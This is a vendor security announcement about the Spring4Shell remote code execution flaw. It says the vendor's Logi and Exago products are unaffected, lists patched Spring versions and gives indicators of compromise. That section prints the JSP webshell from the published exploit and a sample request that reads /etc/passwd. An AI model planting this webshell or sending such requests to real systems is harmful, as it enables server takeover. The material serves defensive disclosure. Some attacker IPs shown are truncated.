---
title: "Spring Framework RCE Announcement"
id: 5305559811607
section: "Announcements"
category: "General"
url: https://devnet.logianalytics.com/hc/en-us/articles/5305559811607-Spring-Framework-RCE-Announcement
updated_at: 2022-04-12T14:26:20Z
---

# Spring Framework RCE Announcement

An RCE vulnerability has been announced for an vulnerability that impacts the Spring MVC and Spring WebFlux applications running on JDK9+.

Select the following link to read details of this vulnerability: <https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement>.

The exploitation of the vulnerability also requires Apache Tomcat, an application packaged as a WAR, and the spring-webmvc or spring-webflux dependencies.

"The vulnerability impacts Spring MVC and Spring WebFlux applications running on JDK 9+. The specific exploit requires the application to run on Tomcat as a WAR deployment," reads the [Spring advisory](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement).

## Vulnerability in Logi Info, Logi Report and Logi Composer

This vulnerability does not affect current or past versions of Info, Report, or Composer.

## Vulnerability in Izenda in Exago BI Products

This vulnerability does not affect current or past versions of Izenda or Exago.

## Vulnerability Details

An attacker could exploit Spring4Shell by sending a specially crafted request to a vulnerable server. However, exploitation of Spring4Shell requires certain prerequisites, whereas the original Log4Shell vulnerability affected all versions of Log4j 2 using the default configuration.

Using both JDK 9+ and Spring Framework together does not necessarily equate to being vulnerable to Spring4Shell, as the application would need to be configured in a way for an attacker to exploit the flaw. For instance, Spring has [recommended developers specify the allowedFields property when using the DataBinder class](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/validation/DataBinder.html). Researchers have confirmed that not specifying this property could enable an attacker to leverage Spring4Shell against a vulnerable application.

There are multiple working proof-of-concept (PoC) exploits available for both [Spring4Shell](https://github.com/search?q=Spring4Shell) and [CVE-2022-22963](https://github.com/search?q=CVE-2022-22963).

The Spring versions that fix the new vulnerability are listed below

* Spring Framework 5.3.18 and Spring Framework 5.2.20
* Spring Boot 2.5.12
* Spring Boot 2.6.6

<https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/>

<https://www.tenable.com/blog/spring4shell-faq-spring-framework-remote-code-execution-vulnerability>

<https://www.bleepingcomputer.com/news/security/cisa-orders-agencies-to-patch-actively-exploited-sophos-firewall-bug/>

Indicator of Compromise

The currently published exploit will change the logging configuration, writing a file to the application's root directory. Next, the attacker will send requests that contain code to be written to this new "log file". Finally, the attacker will access the log file with a browser to execute the code. The code in the currently published exploit does create a simple webshell:

```
<% if("j".equals(request.getParameter("pwd"))){  
      java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();  
      int a = -1;  
      byte[] b = new byte[2048];  
      while((a=inread(b))!=-1) {  
        out.println(new String(b));  
      }  
} %>
```

Files like this, present in the application's directory, could be used as an indicator of compromise. The exploit alters the logging configuration. After the exploit is executed, all access logs will be appended to this script, and these logs are also sent back to the attacker as the attacker accesses the script. A typical filename is "tomcatwar.jsp", but of course the name of the parameters, and the filename, are easily changed.

A typical request looking for the web shell will look like:

```
GET /tomcatwar.jsp?pwd=j&cmd=cat%20/etc/passwd
```

There have been attempts install the web shell, as well as attempts to access existing webshells. Here area a few IPs that have been particularly noticeable:

* 28.147.15
* 214.146.5
* 247.202.6

The filename "wpz.jsp" has also been seen, in particular by 103.214.146.5.
